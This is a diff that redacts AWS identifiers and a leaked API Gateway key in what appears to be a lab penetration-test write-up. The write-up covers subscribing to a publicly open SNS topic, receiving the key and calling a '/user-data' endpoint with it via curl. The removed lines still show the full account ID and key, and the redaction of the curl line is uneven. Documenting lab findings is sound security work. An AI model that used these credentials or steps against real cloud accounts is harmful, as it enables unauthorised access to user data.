@@ -23,9 +23,9 @@ aws sts get-caller-identity --profile cg_sns_secrets
 ```
 ```json
 {
-    "UserId": "AIDAVVYTW6AMF5RD5RKC5",
-    "Account": "390346502168",
-    "Arn": "arn:aws:iam::390346502168:user/cg-sns-user-cgid7r09976gdu"
+    "UserId": "AI..C5",
+    "Account": "390..68",
+    "Arn": "arn:aws:..d7r09976gdu"
 }
 ```
 
@@ -86,7 +86,7 @@ aws sns list-topics --profile cg_sns_secrets
 ```json
 {
     "Topics": [
-        {"TopicArn": "arn:aws:sns:us-east-1:390346502168:public-topic-cgid7r09976gdu"}
+        {"TopicArn": "arn:aws:sn..7r09976gdu"}
     ]
 }
 ```
@@ -101,7 +101,7 @@ The topic's access policy was retrieved via `get-topic-attributes` and revealed 
             "Effect": "Allow",
             "Principal": "*",
             "Action": ["sns:Subscribe", "sns:Receive", "sns:ListSubscriptionsByTopic"],
-            "Resource": "arn:aws:sns:us-east-1:390346502168:public-topic-cgid7r09976gdu"
+            "Resource": "arn:aws:..ublic-topic-cgid7r09976gdu"
         }
     ]
 }
@@ -174,7 +174,7 @@ The SNS topic `public-topic-cgid7r09976gdu` carried a resource policy granting `
 #### Proof of Concept
 After subscribing to the topic, the following sensitive value was received via the notification channel:
 ```
-DEBUG: API GATEWAY KEY OSzkSLqI5T4S3AkzsHZcW1adz3xdbegh8qGvA5Z9
+DEBUG: API GATEWAY KEY OSz..begh8qGvA5Z9
 ```
 This is a live AWS API Gateway key, disclosed in plaintext to any principal capable of subscribing to the topic — which, per the topic's own access policy, was unrestricted.
 
@@ -223,7 +223,7 @@ The API Gateway REST API `cg-api-cgid7r09976gdu` exposed a `GET /user-data` reso
 2. Send a GET request to the `/user-data` resource with the key in the `x-api-key` header:
    ```bash
    curl -X GET 'https://ey90gyffn0.execute-api.us-east-1.amazonaws.com/prod-cgid7r09976gdu/user-data' \
-     -H 'x-api-key: OSzkSLqI5T4S3AkzsHZcW1adz3xdbegh8qGvA5Z9'
+     -H 'x-api-key: OSzkSLqI5T..dz3xdbegh8qGvA5Z9'
    ```
 
 #### Proof of Concept
